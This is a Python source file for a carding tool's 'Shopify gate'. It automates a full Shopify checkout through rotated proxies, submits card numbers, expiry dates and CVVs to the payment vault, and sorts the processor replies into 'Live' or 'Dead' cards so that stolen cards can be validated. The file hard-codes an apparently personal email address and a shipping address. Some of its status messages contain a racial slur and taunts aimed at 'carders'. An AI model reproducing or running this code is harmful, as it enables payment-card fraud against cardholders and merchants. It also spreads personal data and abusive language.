import requests
from FUNC.GATES.SHOPIFY.rand_func import random_user_api
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import time
import random
from FUNC.usersdb_func import *
rand_user = random_user_api().get_random_user_info()


def find_between(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None


def check_shopify(cc, mes, ano, cvv):
    try:
        proxylist = open("FILES/proxy.txt",encoding="UTF-8").read().splitlines()
        getproxy = random.choice(proxylist)
        ip = getproxy.split(":")[0]
        port = getproxy.split(":")[1]
        user = getproxy.split(":")[2]
        password = getproxy.split(":")[3]

        proxies={
                "https": f"http://{user}:{password}@{ip}:{port}/",
                "http": f"http://{user}:{password}@{ip}:{port}/",
            }
        link = open("FILES/product_link.txt").read()
        r = requests.Session()

        first_url = link
        first = r.get(first_url, proxies=proxies)
        print("REQUEST 1 DONE .")
        variantId = find_between(first.text, 'variantId":', ',')
        if not variantId:
            variantId = find_between(first.text, 'ariant-id="', '"')
        if not first or not variantId:
            return ("ERROR IN REQUEST 1")

        bs = BeautifulSoup(first.text, 'html.parser')
        hidden_tags = bs.find_all("input", type="hidden")
        a2c_data = {
            'id': variantId,
            'quantity': 1,
        }

        for x in hidden_tags:
            if 'properties' in x.get('name'):
                a2c_data[x.get('name')] = x.get('value')
        webname = urlparse(first_url).netloc

        second = r.post(f'https://{webname}/cart/add.js',
                        data=a2c_data,
                        headers={'x-requested-with': 'XMLHttpRequest'},
                        proxies=proxies)
        print("REQUEST 2 DONE .")
        variantId = find_between(second.text, '"id":', ',')
        if not second or not variantId:
            return (second.text)

        third = r.get(f'https://{webname}/checkout', proxies=proxies)
        print("REQUEST 3 DONE .")
        if not third or not third.url:
            return ('ERROR IN REQUEST 1')

        four = r.get(third.url, proxies=proxies)
        print("REQUEST 4 DONE .")
        authenticity_token = find_between(
            four.text,
            '<input type="hidden" name="authenticity_token" value="', '"')
        if not four or not authenticity_token:
            return ("ERROR IN REQUEST 4")

        head_1 = {
            '_method': 'patch',
            'authenticity_token': authenticity_token,
            'previous_step': 'contact_information',
            'step': 'shipping_method',
            'checkout[email]': 'mainulhasanbd2005@gmail.com',
            'checkout[buyer_accepts_marketing]': '0',
            'checkout[buyer_accepts_marketing]': '1',
            'checkout[shipping_address][first_name]': 'jhon',
            'checkout[shipping_address][last_name]': 'doe',
            'checkout[shipping_address][address1]': '576 Brown Avenue',
            'checkout[shipping_address][address2]': '',
            'checkout[shipping_address][city]': 'Seneca',
            'checkout[shipping_address][country]': 'US',
            'checkout[shipping_address][province]': 'South Carolina',
            'checkout[shipping_address][zip]': '29678',
            'checkout[shipping_address][phone]': '8032011712',
            'checkout[shipping_address][country]': 'United States',
            'checkout[shipping_address][first_name]': 'jhon',
            'checkout[shipping_address][last_name]': 'doe',
            'checkout[shipping_address][address1]': '576 Brown Avenue',
            'checkout[shipping_address][address2]': '',
            'checkout[shipping_address][city]': 'Seneca',
            'checkout[shipping_address][province]': 'SC',
            'checkout[shipping_address][zip]': '29678',
            'checkout[shipping_address][phone]': '(803) 201-1712',
            'checkout[note]': '',
            'checkout[client_details][browser_width]': '1349',
            'checkout[client_details][browser_height]': '629',
            'checkout[client_details][javascript_enabled]': '1',
            'checkout[client_details][color_depth]': '24',
            'checkout[client_details][java_enabled]': 'false',
            'checkout[client_details][browser_tz]': '-330'
        }
        five = r.post(third.url, data=head_1, proxies=proxies)
        print("REQUEST 5 DONE .")
        if not five:
            return ('ERROR IN REQUEST 5')
        bs = BeautifulSoup(five.text, 'html.parser')
        hidden_tags = bs.find_all(
            "p", {'class': 'field__message field__message--error'})
        if hidden_tags:
            for x in hidden_tags:
                return (x.getText())
            quit()
        if 'Shipping Method' in five.text or 'Shipping method' in five.text:
            d = r.get(third.url + '/shipping_rates?step=shipping_method')
            # with open('d.html', 'w') as w: w.write(d.text)
        ship_tag = find_between(
            d.text, '<div class="radio-wrapper" data-shipping-method="', '"')

        data = {
            '_method': 'patch',
            'authenticity_token': authenticity_token,
            'previous_step': 'shipping_method',
            'step': 'payment_method',
            'checkout[shipping_rate][id]': ship_tag,
            'checkout[client_details][browser_width]': '1349',
            'checkout[client_details][browser_height]': '629',
            'checkout[client_details][javascript_enabled]': '1',
            'checkout[client_details][color_depth]': '24',
            'checkout[client_details][java_enabled]': 'false',
            'checkout[client_details][browser_tz]': '-330'
        }
        six = r.post(third.url, data=data, proxies=proxies)
        print("REQUEST 6 DONE .")
        price = find_between(six.text, '"payment_due":', '}')
        payment_gateway = find_between(six.text,
                                       'data-subfields-for-gateway="', '"')

        h = {
        'Accept': 'application/json',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Length': '166',
        'Content-Type': 'application/json',
        'Host': 'deposit.us.shopifycs.com',
        'Origin': 'https://checkout.shopifycs.com',
        'Referer': 'https://checkout.shopifycs.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'Sec-GPC': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36'
        }

        json_four = {
            "credit_card": {
                "number": cc,
                "name": rand_user.first_name,
                "month": mes,
                "year": ano,
                "verification_value": cvv
            },
            "payment_session_scope": webname
        }

        seven = r.post('https://deposit.us.shopifycs.com/sessions',
                       json=json_four,
                       proxies=proxies)
        #   print("REQUEST 7 DONE .")
        west = find_between(seven.text, '"id":"', '"')

        f_data = {
            '_method': 'patch',
            'authenticity_token': authenticity_token,
            'previous_step': 'payment_method',
            'step': '',
            's': west,
            'checkout[payment_gateway]': payment_gateway,
            'checkout[credit_card][vault]': 'false',
            'checkout[different_billing_address]': 'false',
            'checkout[remember_me]': 'false',
            'checkout[remember_me]': '0',
            'checkout[vault_phone]': rand_user.phone,
            'checkout[total_price]': price,
            'complete': '1',
            'checkout[client_details][browser_width]': '674',
            'checkout[client_details][browser_height]': '662',
            'checkout[client_details][javascript_enabled]': '1',
            'checkout[client_details][color_depth]': '24',
            'checkout[client_details][java_enabled]': 'false',
            'checkout[client_details][browser_tz]': '-330',
        }

        f = r.post(third.url, f_data, proxies=proxies)
        #   print("REQUEST 8 DONE .")
        time.sleep(1)
        if 'processing' not in f.url:
            return ("CARD PROCESSING ERROR")
        time.sleep(3)
        g = r.get(third.url + '/processing?from_processing_page=1',
                  proxies=proxies).text
        time.sleep(4)
        text1 = find_between(g, '<p class="notice__text">',
                             '</p></div></div>')
        if text1 == None:
            try:
                with open("FILES/result.txt","a",encoding="UTF-8") as f:
                    f.write(f"{g}\n")
            except Exception as e:
                pass
            return g
        else:
            return text1
    except Exception as e:
        return str(e)

def mchkshopify(input,user_id):
    try:
        cc = input.split("|")[0]
        mes = input.split("|")[1]
        ano = input.split("|")[2]
        cvv = input.split("|")[3]
        result = check_shopify(cc,mes,ano,cvv)
        if 'thank you' in result or 'Your order is confirmed' in result or "Thank you" in result:
            status = "Live 🟢"
            response = "Payment Successfull ✅"


        elif "insufficient_funds" in result or "card has insufficient funds." in result:
            status = "Live 🟢"
            response = "Insufficient Funds ❎"

        elif "Security code was not matched by the processor" in result:
            status = "Live 🟡"
            response = "Security code was not matched by the processor ❎"

        elif "transaction_not_allowed" in result:
            status = "Live 🟡"
            response = "Card Doesn't Support Purchase ❎"  

        elif '"cvc_check": "pass"' in result:
            status = "Live 🟢"
            response = "CVV LIVE ❎"

        elif "https://js.stripe.com/v3" in result:
            status = "Live 🟡"
            response = "3D Secure Redirected ❎"

        elif "stripe_3ds2_fingerprint" in result:
            status = "Live 🟡"
            response = "3D Secured ❎"

        elif "Your card does not support this type of purchase." in result:
            status = "Live 🟡"
            response = "Card Doesn't Support Purchase ❎"

        elif "generic_decline" in result or "You have exceeded the maximum number of declines on this card in the last 24 hour period." in result or "card_decline_rate_limit_exceeded" in result:
            status = "Dead 🔴"
            response = "𝐃𝐄𝐀𝐃 𝐂𝐀𝐑𝐃 𝐍𝐈𝐆𝐆𝐀! 💔❌"

        elif "do_not_honor" in result:
            status = "Dead 🔴"
            response = "𝐃𝐈𝐃 𝐍𝐎𝐓 𝐇𝐎𝐍𝐎𝐑 𝐘𝐎𝐔 𝐀𝐒 𝐀 𝐂𝐀𝐑𝐃𝐄𝐑 𝐋𝐌𝐀𝐎💔❌"
        elif "Cannot connect to proxy." in result:
            status = "Dead 🔴"
            response = "Proxy Error 🚫"
        elif "CERTIFICATE_VERIFY_FAILED" in result:
            status = "Dead 🔴"
            response = "Can't Reach to The Site 🚫"
        elif "CARD PROCESSING ERROR" in result:
            status = "Dead 🔴"
            response = "Unable To Process This Card 🚫"
        elif "Card was declined" in result:
            status = "Dead 🔴"
            response = "Card Was Declined 🚫"

        elif "fraudulent" in result:
            status = "Dead 🔴"
            response = "Fraudulent 🚫"

        elif "stolen_card" in result:
            status = "Dead 🔴"
            response = "Stolen Card 🚫"

        elif "lost_card" in result:
            status = "Dead 🔴"
            response = "Lost Card 🚫"

        elif "pickup_card" in result:
            status = "Dead 🔴"
            response = "Pickup Card 🚫"

        elif "Card number is incorrect" in result:
            status = "Dead 🔴"
            response = "Incorrect Card Number 🚫"

        elif "Your card has expired." in result or "expired_card" in result:
            status = "Dead 🔴"
            response = "Expired Card 🚫"

        elif "intent_confirmation_challenge" in result:
            status = "Dead 🔴"
            response = "Captcha 😥"

        elif "Your card number is incorrect." in result:
            status = "Dead 🔴"
            response = "Incorrect Card Number 🚫"

        elif "Your card's expiration year is invalid." in result or "Your card\'s expiration year is invalid." in result:
            status = "Dead 🔴"
            response = "Expiration Year Invalid 🚫"

        elif "Your card's expiration month is invalid." in result or "invalid_expiry_month" in result:
            status = "Dead 🔴"
            response = "Expiration Month Invalid 🚫"

        elif "card is not supported." in result:
            status = "Dead 🔴"
            response = "Card Not Supported 🚫"

        elif "invalid_account" in result:
            status = "Dead 🔴"
            response = "Dead Card 🚫"

        elif "Invalid API Key provided" in result or "testmode_charges_only" in result or "api_key_expired" in result:
            status = "Dead 🔴"
            response = "SK DEAD 🚫"
            refundcredit(user_id)

        elif "Your card was declined." in result or "card was declined" in result:
            status = "Dead 🔴"
            response = "𝐃𝐄𝐀𝐃 𝐂𝐀𝐑𝐃 𝐍𝐈𝐆𝐆𝐀! 💔❌"

        else:
            status = "Dead 🔴"
            response = f"Card Declined 🚫"
            refundcredit(user_id)
            with open("FILES/hopify_error.txt","a",encoding="UTF-8") as f:
                f.write(f"{result}\n")
        return (f"<code>{input}</code>\n<b>𝐑𝐄𝐒𝐔𝐋𝐓 ⟿ {response}</b>\n")
    except Exception as e:
        with open("error_logs.txt", "a") as f:
                    f.write(f"{e}\n")